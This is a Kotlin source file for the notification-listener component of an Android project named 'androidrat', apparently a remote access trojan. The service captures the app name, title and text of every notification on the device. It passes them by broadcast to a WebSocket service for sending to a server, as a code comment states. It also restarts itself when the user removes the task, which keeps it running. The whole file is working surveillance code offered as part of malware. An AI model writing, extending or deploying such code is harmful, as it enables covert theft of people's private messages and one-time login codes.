package com.nqmgaming.androidrat.service

import android.app.Notification
import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.widget.Toast

class NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        // Send notification to server

        sbn?.let {
            val packageName = it.packageName
            val content = extractNotificationContent(it)
            val title = it.notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            Log.d("NotificationListener", "Notification received: $packageName - $title - $content")
            // Send notification data to WebSocketService using a broadcast intent
            val intent = Intent("notification_data").apply {
                putExtra("package_name", packageName)
                putExtra("notification_content", content)
                putExtra("notification_title", title)
            }
            sendBroadcast(intent)
        }

    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun extractNotificationContent(sbn: StatusBarNotification): String? {
        val notification = sbn.notification

        notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.let {
            return it.toString()
        }

        return null
    }
}